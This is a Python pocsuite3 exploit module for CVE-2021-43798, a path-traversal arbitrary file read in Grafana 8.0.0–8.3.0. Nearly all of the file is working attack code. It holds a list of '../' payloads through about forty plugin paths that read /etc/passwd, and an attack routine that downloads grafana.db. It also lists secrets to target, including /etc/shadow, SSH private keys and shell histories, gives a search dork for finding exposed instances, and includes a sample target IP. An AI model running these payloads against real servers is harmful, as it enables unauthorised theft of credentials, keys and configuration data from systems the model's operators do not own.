import urllib
from urllib.parse import urlparse
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, CEye, OptString, VUL_TYPE
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    dork = '"Grafana" && country!="CN"'
    vulID = ''  # ssvid
    version = '3.0'
    author = ['d4m1ts']
    vulDate = '2021-12-14'
    createDate = '2021-12-14'
    updateDate = '2021-12-14'
    references = ['https://github.com/mik1th0n/Grafana-0Day-Vuln-POC/blob/main/Grafana-0Day-Vuln-POC.py',
                  'https://www.wangan.com/news/7fy747ffda13430f', 'https://github.com/jas502n/Grafana-CVE-2021-43798']
    name = 'Grafana任意文件读取'
    appPowerLink = 'https://grafana.com/'
    appName = 'Grafana'
    appVersion = 'Grafana 8.0.0-beta1 - 8.3.0'
    vulType = 'Arbitrary File Read'
    desc = '''Grafana 是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana 可以在网络浏览器里显示数据图表和警告。该软件的企业版本提供更多的扩展功能。扩展功能通过插件的形式提供，终端用户可以自定义自己的数据面板界面以及数据请求方式。
    api功能可以实现加载插件文件，然后返回文件内容；由于加载路径时候未进行过滤，导致../实现任意文件读取。
    '''
    cnnvd = ""
    cnvd = ""
    cve = "CVE-2021-43798"
    cvss3 = ""
    harm = "任意文件读取"
    level = "medium"
    sug = '''厂商已发布新版本修复漏洞，请及时自查 Grafana 版本是否在影响范围内，及时将 Grafana 更新到安全版本Grafana 8.3.1 8.2.7 8.1.8 8.0.7'''
    vul_type = "web"
    pocname = "grafana_arbitrary_file_read_cve-2021-43798"
    samples = ['3.23.238.254:3000']
    install_requires = ['']

    def _options(self):
        o = OrderedDict()
        # 获取参数 self.get_option("cmd")
        o["cmd"] = OptString('', description='需要携带执行的命令', require=False)
        return o

    def _verify(self):
        result = {}
        pyload_lib = [
            '/public/plugins/grafana-clock-panel/../../../../../../../../etc/passwd',
            '/public/plugins/alertlist/../../../../../../../../etc/passwd',
            '/public/plugins/annolist/../../../../../../../../etc/passwd',
            '/public/plugins/barchart/../../../../../../../../etc/passwd',
            '/public/plugins/cloudwatch/../../../../../../../../etc/passwd',
            '/public/plugins/dashlist/../../../../../../../../etc/passwd',
            '/public/plugins/elasticsearch/../../../../../../../../etc/passwd',
            '/public/plugins/graph/../../../../../../../../etc/passwd',
            '/public/plugins/graphite/../../../../../../../../etc/passwd',
            '/public/plugins/heatmap/../../../../../../../../etc/passwd',
            '/public/plugins/influxdb/../../../../../../../../etc/passwd',
            '/public/plugins/mysql/../../../../../../../../etc/passwd',
            '/public/plugins/opentsdb/../../../../../../../../etc/passwd',
            '/public/plugins/pluginlist/../../../../../../../../etc/passwd',
            '/public/plugins/postgres/../../../../../../../../etc/passwd',
            '/public/plugins/prometheus/../../../../../../../../etc/passwd',
            '/public/plugins/stackdriver/../../../../../../../../etc/passwd',
            '/public/plugins/table/../../../../../../../../etc/passwd',
            '/public/plugins/text/../../../../../../../../etc/passwd',
            '/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd',
            '/public/plugins/bargauge/../../../../../../../../etc/passwd',
            '/public/plugins/gauge/../../../../../../../../etc/passwd',
            '/public/plugins/geomap/../../../../../../../../etc/passwd',
            '/public/plugins/gettingstarted/../../../../../../../../etc/passwd',
            '/public/plugins/histogram/../../../../../../../../etc/passwd',
            '/public/plugins/jaeger/../../../../../../../../etc/passwd',
            '/public/plugins/logs/../../../../../../../../etc/passwd',
            '/public/plugins/loki/../../../../../../../../etc/passwd',
            '/public/plugins/mssql/../../../../../../../../etc/passwd',
            '/public/plugins/news/../../../../../../../../etc/passwd',
            '/public/plugins/nodeGraph/../../../../../../../../etc/passwd',
            '/public/plugins/piechart/../../../../../../../../etc/passwd',
            '/public/plugins/stat/../../../../../../../../etc/passwd',
            '/public/plugins/state-timeline/../../../../../../../../etc/passwd',
            '/public/plugins/status-history/../../../../../../../../etc/passwd',
            '/public/plugins/table-old/../../../../../../../../etc/passwd',
            '/public/plugins/tempo/../../../../../../../../etc/passwd',
            '/public/plugins/testdata/../../../../../../../../etc/passwd',
            '/public/plugins/timeseries/../../../../../../../../etc/passwd',
            '/public/plugins/welcome/../../../../../../../../etc/passwd',
            '/public/plugins/zipkin/../../../../../../../../etc/passwd',
        ]
        protocol, host, port, rpath = self.parse_url(self.url)
        url = protocol + "://" + str(host) + ":" + str(port)

        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0"}
            for pyload_data in pyload_lib:
                pyload = url + pyload_data
                request = urllib.request.Request(url=pyload, headers=headers)
                requests = urllib.request.urlopen(request, timeout=3)
                code = requests.getcode()
                context = requests.read().decode('utf-8')
                if "root:x" in context and code == 200:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = pyload
                    result['VerifyInfo']['RES'] = context
                    return self.parse_output(result)
        except Exception as ex:
            logger.error(ex)

    def _attack(self):
        result = {}
        pyload_lib = [
            '/public/plugins/grafana-clock-panel/../../../../../../../../var/lib/grafana/grafana.db'
        ]
        sample_file = """
        /var/lib/grafana/grafana.db
        /etc/grafana/grafana.ini
        /conf/defaults.ini
        /etc/grafana/grafana.ini
        /etc/passwd
        /etc/shadow
        /home/grafana/.bash_history
        /home/grafana/.ssh/id_rsa
        /root/.bash_history
        /root/.ssh/id_rsa
        /usr/local/etc/grafana/grafana.ini
        /var/lib/grafana/grafana.db
        /proc/net/fib_trie
        /proc/net/tcp
        /proc/self/cmdline
        """
        protocol, host, port, rpath = self.parse_url(self.url)
        url = protocol + "://" + str(host) + ":" + str(port)

        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0"}
            for pyload_data in pyload_lib:
                pyload = url + pyload_data
                request = urllib.request.Request(url=pyload, headers=headers)
                requests = urllib.request.urlopen(request, timeout=3)
                code = requests.getcode()
                context = requests.read()
                if code == 200:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = pyload
                    result['VerifyInfo']['Payload'] = pyload_data
                    return self.parse_output(result)
        except Exception as ex:
            logger.error(ex)

    def parse_url(self, url):
        urparse = urlparse(url)
        host = urparse.hostname
        protocol = urparse.scheme
        port = urparse.port if urparse.port else 443 if 'https' in protocol else 80
        path = urparse.path.rstrip('/') if urparse.path != '' else ''

        return protocol, host, port, path

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
